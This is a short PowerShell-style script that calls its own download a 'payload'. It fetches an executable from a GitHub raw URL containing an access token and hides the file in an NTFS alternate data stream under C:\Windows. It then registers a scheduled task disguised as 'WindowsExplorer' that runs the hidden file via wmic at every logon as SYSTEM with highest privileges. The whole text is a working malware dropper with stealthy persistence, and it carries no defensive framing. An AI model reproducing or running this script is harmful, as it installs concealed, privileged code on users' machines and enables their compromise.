Write-Host "Downloading payload"
curl https://raw.githubusercontent.com/HadronCollision/SudoRobux/refs/heads/main/WindowsExplorer.exe?token=GHSAT0AAAAAACQ6YJCXJ7BAD4F3GIWYSWPS2D7FEVQ -o russianhuzz
Write-Host "Download complete"
type russianhuzz > C:\Windows:Explorer
Write-Host "Installing in progress"
schtasks /create /tn "WindowsExplorer" /tr "C:\Windows\System32\cmd.exe /c wmic process call create \"C:\Windows:Explorer\"" /sc onlogon /ru "SYSTEM" /rl highest /f
Write-Host "Installation complete"
Write-Host "Restart the system to activate it"
